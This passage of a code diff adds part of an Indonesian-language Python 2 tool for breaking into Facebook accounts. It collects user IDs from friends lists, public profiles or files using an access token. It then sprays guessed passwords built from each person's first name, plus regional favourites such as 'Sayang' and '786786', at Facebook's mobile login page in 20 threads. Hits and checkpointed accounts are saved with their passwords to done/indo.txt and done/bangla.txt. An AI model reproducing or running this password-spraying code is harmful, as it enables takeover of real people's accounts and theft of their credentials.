+			print '\x1b[0;91mFile tidak ada ! '
+			raw_input('\x1b[0;97m<\x1b[0;96m Kembali\x1b[0;97m >')
+		except IOError:
+			print '\x1b[0;91mFile tidak ada !'
+			raw_input('\n\x1b[0;97m< \x1b[0;96mKembali \x1b[0;97m>')
+			crack_indo()
+		
+
+	if teak == '0' or teak == '00':
+		crack_teman()
+	else:
+		print '\x1b[0;91m! Isi Yg Benar'
+		pilih_indo()
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;96mJumlah ID\x1b[0;91m :\x1b[0;92m ' + str(len(id))
+	time.sleep(0.07)
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;96mStop Tekan CTRL+Z'
+	titik = [
+		'.   ',
+		'..  ',
+		'... ']
+	for o in titik:
+		print '\r\x1b[0;91m\xe2\x80\xa2 \x1b[0;96mCrack Berjalan ' + o,
+		sys.stdout.flush()
+		time.sleep(1)
+	
+	print '\n\x1b[0;91m\xe2\x80\xa2 \x1b[0;96mTidak Ada Hasil ? Gunakan Mode Pesawat 1 Detik !'
+	time.sleep(0.07)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	
+	def main(arg):
+		em = arg
+		
+		try:
+			os.mkdir('done')
+		except OSError:
+			pass
+
+		
+		try:
+			an = requests.get('https://graph.facebook.com/' + em + '/?access_token=' + toket)
+			v = json.loads(an.text)
+			pw = v['first_name'] + '123'
+			rex = requests.post('https://mbasic.facebook.com/login.php', data = {
+				'email': em,
+				'pass': pw,
+				'login': 'submit' }, headers = {
+				'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+			xo = rex.content
+			if 'mbasic_logout_button' in xo or 'save-device' in xo:
+				print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + em + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pw
+				oke = open('done/indo.txt', 'a')
+				oke.write('\n[Berhasil] ' + em + ' \xe2\x88\x86 ' + pw)
+				oke.close()
+				oks.append(em)
+			elif 'checkpoint' in xo:
+				print '\x1b[0;96m[Cekpoint]\x1b[0;97m ' + em + ' \x1b[0;96m\xe2\x88\x86\x1b[0;97m ' + pw
+				cek = open('done/indo.txt', 'a')
+				cek.write('\n[Cekpoint] ' + em + ' \xe2\x88\x86 ' + pw)
+				cek.close()
+				cekpoint.append(em)
+			else:
+				pw2 = v['first_name'] + '12345'
+				rex = requests.post('https://mbasic.facebook.com/login.php', data = {
+					'email': em,
+					'pass': pw2,
+					'login': 'submit' }, headers = {
+					'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+				xo = rex.content
+				if 'mbasic_logout_button' in xo or 'save-device' in xo:
+					print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + em + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pw2
+					oke = open('done/indo.txt', 'a')
+					oke.write('\n[Berhasil] ' + em + ' \xe2\x88\x86 ' + pw2)
+					oke.close()
+					oks.append(em)
+				elif 'checkpoint' in xo:
+					print '\x1b[0;96m[Cekpoint]\x1b[0;97m ' + em + ' \x1b[0;96m\xe2\x88\x86\x1b[0;97m ' + pw2
+					cek = open('done/indo.txt', 'a')
+					cek.write('\n[Cekpoint] ' + em + ' \xe2\x88\x86 ' + pw2)
+					cek.close()
+					cekpoint.append(em)
+				else:
+					pw3 = v['first_name'] + '1234'
+					rex = requests.post('https://mbasic.facebook.com/login.php', data = {
+						'email': em,
+						'pass': pw3,
+						'login': 'submit' }, headers = {
+						'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+					xo = rex.content
+					if 'mbasic_logout_button' in xo or 'save-device' in xo:
+						print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + em + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pw3
+						oke = open('done/indo.txt', 'a')
+						oke.write('\n[Berhasil] ' + em + ' \xe2\x88\x86 ' + pw3)
+						oke.close()
+						oks.append(em)
+					elif 'checkpoint' in xo:
+						print '\x1b[0;96m[Cekpoint]\x1b[0;97m ' + em + ' \x1b[0;96m\xe2\x88\x86\x1b[0;97m ' + pw3
+						cek = open('done/indo.txt', 'a')
+						cek.write('\n[Cekpoint] ' + em + ' \xe2\x88\x86 ' + pw3)
+						cek.close()
+						cekpoint.append(em)
+					else:
+						pw4 = 'Sayang'
+						rex = requests.post('https://mbasic.facebook.com/login.php', data = {
+							'email': em,
+							'pass': pw4,
+							'login': 'submit' }, headers = {
+							'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+						xo = rex.content
+						if 'mbasic_logout_button' in xo or 'save-device' in xo:
+							print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + em + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pw4
+							oke = open('done/indo.txt', 'a')
+							oke.write('\n[Berhasil] ' + em + ' \xe2\x88\x86 ' + pw4)
+							oke.close()
+							oks.append(em)
+						elif 'checkpoint' in xo:
+							print '\x1b[0;96m[Cekpoint]\x1b[0;97m ' + em + ' \x1b[0;96m\xe2\x88\x86\x1b[0;97m ' + pw4
+							cek = open('done/indo.txt', 'a')
+							cek.write('\n[Cekpoint] ' + em + ' \xe2\x88\x86 ' + pw4)
+							cek.close()
+							cekpoint.append(em)
+		except:
+			pass
+		
+
+
+	p = ThreadPool(20)
+	p.map(main, id)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;96mSelesai ...'
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;96mTotal \x1b[0;92mOK\x1b[0;97m/\x1b[0;96mCP \x1b[0;97m: \x1b[0;92m' + str(len(oks)) + '\x1b[0;97m/\x1b[0;96m' + str(len(cekpoint))
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;92mOK\x1b[0;97m/\x1b[0;96mCP \x1b[0;96mfile tersimpan \x1b[0;91m: \x1b[0;92mdone/indo.txt'
+	print 50 * '\x1b[0;93m\xe2\x94\x80'
+	raw_input('\x1b[0;97m< \x1b[0;96mKembali\x1b[0;97m >')
+	os.system('python2 crack-2.py')
+
+def crack_bangla():
+	global toket
+	os.system('clear')
+	
+	try:
+		toket = open('login.txt', 'r').read()
+	except IOError:
+		print '\x1b[0;91m! Token Invalid'
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		keluar()
+
+	os.system('clear')
+	print logo
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	print '\x1b[0;94m1.\x1b[0;97m Crack Dari Daftar Teman'
+	time.sleep(0.07)
+	print '\x1b[0;94m2.\x1b[0;97m Crack Dari Publik/Teman'
+	time.sleep(0.07)
+	print '\x1b[0;94m3.\x1b[0;97m Crack Dari File'
+	time.sleep(0.07)
+	print '\x1b[0;91m0.\x1b[0;97m Kembali'
+	time.sleep(0.07)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	pilih_bangla()
+
+def pilih_bangla():
+	teak = raw_input('\x1b[0;94m>\x1b[0;97m ')
+	if teak == '':
+		print '\x1b[0;91m! Isi Yg Benar'
+		pilih_bangla()
+	elif teak == '1':
+		os.system('clear')
+		print logo
+		print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+		time.sleep(0.07)
+		r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
+		z = json.loads(r.text)
+		for s in z['data']:
+			id.append(s['id'])
+		
+	elif teak == '2':
+		os.system('clear')
+		print logo
+		print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+		time.sleep(0.07)
+		idt = raw_input('\x1b[0;91m\xe2\x80\xa2 \x1b[0;94mID Publik/Teman \x1b[0;91m:\x1b[0;92m ')
+		time.sleep(0.07)
+		
+		try:
+			pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
+			sp = json.loads(pok.text)
+			print '\x1b[0;91m\xe2\x80\xa2\x1b[0;94m Nama \x1b[0;91m:\x1b[0;92m ' + sp['name']
+		except KeyError:
+			print '\x1b[0;91m! ID publik/teman tidak ada'
+			raw_input('\n\x1b[1;97m< \x1b[0;94mKembali \x1b[0;97m>')
+			crack_bangla()
+		except requests.exceptions.ConnectionError:
+			print '\x1b[0;91m! Tidak ada koneksi'
+			keluar()
+
+		r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+		
+	elif teak == '3' or teak == '03':
+		os.system('clear')
+		print logo
+		
+		try:
+			print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+			time.sleep(0.07)
+			idlist = raw_input('\x1b[0;91m\xe2\x80\xa2 \x1b[0;94mNama File\x1b[0;91m :\x1b[0;92m ')
+			time.sleep(0.07)
+			for line in open(idlist, 'r').readlines():
+				id.append(line.strip())
+		except KeyError:
+			print '\x1b[0;91mFile tidak ada ! '
+			raw_input('\x1b[0;97m<\x1b[0;94m Kembali\x1b[0;97m >')
+		except IOError:
+			print '\x1b[0;91mFile tidak ada !'
+			raw_input('\n\x1b[0;97m< \x1b[0;94mKembali \x1b[0;97m>')
+			crack_bangla()
+		
+
+	if teak == '0' or teak == '00':
+		crack_teman()
+	else:
+		print '\x1b[0;91m! Isi Yg Benar'
+		pilih_bangla()
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;94mJumlah ID\x1b[0;91m :\x1b[0;92m ' + str(len(id))
+	time.sleep(0.07)
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;94mStop Tekan CTRL+Z'
+	titik = [
+		'.   ',
+		'..  ',
+		'... ']
+	for o in titik:
+		print '\r\x1b[0;91m\xe2\x80\xa2 \x1b[0;94mCrack Berjalan ' + o,
+		sys.stdout.flush()
+		time.sleep(1)
+	
+	print '\n\x1b[0;91m\xe2\x80\xa2 \x1b[0;94mTidak Ada Hasil ? Gunakan Mode Pesawat 1 Detik !'
+	time.sleep(0.07)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	
+	def main(arg):
+		em = arg
+		
+		try:
+			os.mkdir('done')
+		except OSError:
+			pass
+
+		
+		try:
+			an = requests.get('https://graph.facebook.com/' + em + '/?access_token=' + toket)
+			v = json.loads(an.text)
+			pz = v['first_name'] + '123'
+			rex = requests.post('https://mbasic.facebook.com/login.php', data = {
+				'email': em,
+				'pass': pz,
+				'login': 'submit' }, headers = {
+				'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+			xo = rex.content
+			if 'mbasic_logout_button' in xo or 'save-device' in xo:
+				print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + em + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pz
+				oke = open('done/bangla.txt', 'a')
+				oke.write('\n[Berhasil] ' + em + ' \xe2\x88\x86 ' + pz)
+				oke.close()
+				oks.append(em)
+			elif 'checkpoint' in xo:
+				print '\x1b[0;94m[Cekpoint]\x1b[0;97m ' + em + ' \x1b[0;94m\xe2\x88\x86\x1b[0;97m ' + pz
+				cek = open('done/bangla.txt', 'a')
+				cek.write('\n[Cekpoint] ' + em + ' \xe2\x88\x86 ' + pz)
+				cek.close()
+				cekpoint.append(em)
+			else:
+				pz2 = v['first_name'] + '12345'
+				rex = requests.post('https://mbasic.facebook.com/login.php', data = {
+					'email': em,
+					'pass': pz2,
+					'login': 'submit' }, headers = {
+					'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+				xo = rex.content
+				if 'mbasic_logout_button' in xo or 'save-device' in xo:
+					print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + em + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pz2
+					oke = open('done/bangla.txt', 'a')
+					oke.write('\n[Berhasil] ' + em + ' \xe2\x88\x86 ' + pz2)
+					oke.close()
+					oks.append(em)
+				elif 'checkpoint' in xo:
+					print '\x1b[0;94m[Cekpoint]\x1b[0;97m ' + em + ' \x1b[0;94m\xe2\x88\x86\x1b[0;97m ' + pz2
+					cek = open('done/bangla.txt', 'a')
+					cek.write('\n[Cekpoint] ' + em + ' \xe2\x88\x86 ' + pz2)
+					cek.close()
+					cekpoint.append(em)
+				else:
+					pz3 = v['first_name'] + '1234'
+					rex = requests.post('https://mbasic.facebook.com/login.php', data = {
+						'email': em,
+						'pass': pz3,
+						'login': 'submit' }, headers = {
+						'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+					xo = rex.content
+					if 'mbasic_logout_button' in xo or 'save-device' in xo:
+						print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + em + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pz3
+						oke = open('done/bangla.txt', 'a')
+						oke.write('\n[Berhasil] ' + em + ' \xe2\x88\x86 ' + pz3)
+						oke.close()
+						oks.append(em)
+					elif 'checkpoint' in xo:
+						print '\x1b[0;94m[Cekpoint]\x1b[0;97m ' + em + ' \x1b[0;94m\xe2\x88\x86\x1b[0;97m ' + pz3
+						cek = open('done/bangla.txt', 'a')
+						cek.write('\n[Cekpoint] ' + em + ' \xe2\x88\x86 ' + pz3)
+						cek.close()
+						cekpoint.append(em)
+					else:
+						pz4 = '786786'
+						rex = requests.post('https://mbasic.facebook.com/login.php', data = {
+							'email': em,
+							'pass': pz4,
+							'login': 'submit' }, headers = {
+							'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]' })
+						xo = rex.content
+						if 'mbasic_logout_button' in xo or 'save-device' in xo:
+							print '\x1b[0;92m[Berhasil]\x1b[0;97m ' + em + ' \x1b[0;92m\xe2\x88\x86 \x1b[0;97m' + pz4
+							oke = open('done/bangla.txt', 'a')
+							oke.write('\n[Berhasil] ' + em + ' \xe2\x88\x86 ' + pz4)
+							oke.close()
+							oks.append(em)
+						elif 'checkpoint' in xo:
+							print '\x1b[0;94m[Cekpoint]\x1b[0;97m ' + em + ' \x1b[0;94m\xe2\x88\x86\x1b[0;97m ' + pz4
+							cek = open('done/bangla.txt', 'a')
+							cek.write('\n[Cekpoint] ' + em + ' \xe2\x88\x86 ' + pz4)
+							cek.close()
+							cekpoint.append(em)
+		except:
+			pass
+		
+
+
+	p = ThreadPool(20)
+	p.map(main, id)
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;94mSelesai ...'
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;94mTotal \x1b[0;92mOK\x1b[0;97m/\x1b[0;94mCP \x1b[0;97m: \x1b[0;92m' + str(len(oks)) + '\x1b[0;97m/\x1b[0;94m' + str(len(cekpoint))
+	print '\x1b[0;91m\xe2\x80\xa2 \x1b[0;92mOK\x1b[0;97m/\x1b[0;94mCP \x1b[0;94mfile tersimpan \x1b[0;91m: \x1b[0;92mdone/bangla.txt'
+	print 50 * '\x1b[0;93m\xe2\x94\x80'
+	raw_input('\x1b[0;97m< \x1b[0;94mKembali\x1b[0;97m >')
+	os.system('python2 crack-2.py')
+
+def crack_pakis():
+	global toket
+	os.system('clear')
+	
+	try:
+		toket = open('login.txt', 'r').read()
+	except IOError:
+		print '\x1b[0;91m! Token Invalid'
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		keluar()
+
+	os.system('clear')
+	print logo
+	print '\x1b[0;93m\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80'
+	time.sleep(0.07)
+	print '\x1b[0;90m1.\x1b[0;97m Crack Dari Daftar Teman'
+	time.sleep(0.07)
+	print '\x1b[0;90m2.\x1b[0;97m Crack Dari Publik/Teman'
+	time.sleep(0.07)
+	print '\x1b[0;90m3.\x1b[0;97m Crack Dari File'
+	time.sleep(0.07)
+	print '\x1b[0;91m0.\x1b[0;97m Kembali'
+	time.sleep(0.07)
